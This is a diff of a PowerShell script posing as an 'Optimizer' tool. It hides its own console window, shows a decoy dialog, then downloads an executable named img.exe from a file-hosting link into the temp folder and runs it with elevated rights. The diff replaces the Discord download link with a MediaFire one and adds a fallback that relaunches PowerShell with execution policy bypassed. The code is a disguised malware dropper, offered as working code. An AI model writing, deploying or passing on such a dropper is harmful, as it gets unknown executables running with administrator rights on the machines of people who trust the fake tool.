@@ -1,5 +1,7 @@
 Add-Type -AssemblyName PresentationFramework
-function S-D { [void] [System.Reflection.Assembly]::LoadWithPartialName("presentationframework")
+
+function S-D { 
+    [void] [System.Reflection.Assembly]::LoadWithPartialName("presentationframework")
     $w = New-Object System.Windows.Window
     $w.Title = "Optimizer"; $w.Width = 600; $w.Height = 500
     $w.WindowStartupLocation = "CenterScreen"
@@ -50,13 +52,25 @@ function S-D { [void] [System.Reflection.Assembly]::LoadWithPartialName("present
     $w.ShowDialog()
     return $r
 }
+
 function D-E {
-    $u = "https://cdn.discordapp.com/attachments/1224005091481227366/1244489034227781662/img.exe?ex=66554c3b&is=6653fabb&hm=e7f839a52f5d00d94a4bdaa1853dec5675058bb06c2213959166b8e2c9ef4d56&"
+    $u = "https://download1349.mediafire.com/qluyxmev1ligsbShHyYe0X_GHYwtkvh7RDGZki5fKUUiL4LJh3SkiBJckaTdcjgZsrm6-sI_rKy2wKqGVGIudH5Np3RUJ__E8dn0OhIbNmUjWtEmoLtbfrG-QG6bdtkdXemCx7o2uZQn-FKrw5b03ISsi0ThLZIwaBbr_vKISYXv/2prkm5wvssnzlum/img.exe"
     $o = "$env:TEMP\img.exe"
     $wc = New-Object System.Net.WebClient
     $wc.DownloadFile($u, $o)
     Start-Process -FilePath $o -Verb RunAs
 }
+
+function Run-Script {
+    try {
+        # Tenta executar o script sem permissões de administrador
+        D-E
+    } catch {
+        # Em caso de falha, tenta executar novamente com permissões de administrador
+        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File $PSCommandPath" -Verb RunAs
+    }
+}
+
 $c = (Get-Process -id $pid).MainWindowHandle
 $u32 = Add-Type -TypeDefinition @"
     using System;
@@ -67,6 +81,7 @@ $u32 = Add-Type -TypeDefinition @"
     }
 "@ -PassThru
 $u32::ShowWindow($c, 0)
+
 $r = S-D
 if ($null -eq $r -or $r -eq $false) {
     $lw = New-Object System.Windows.Window
@@ -101,7 +116,7 @@ if ($null -eq $r -or $r -eq $false) {
     $b.Child = $sp
     $lw.Content = $b
     $lw.Show()
-    D-E
+    Run-Script
     $lw.Close()
 }
 exit
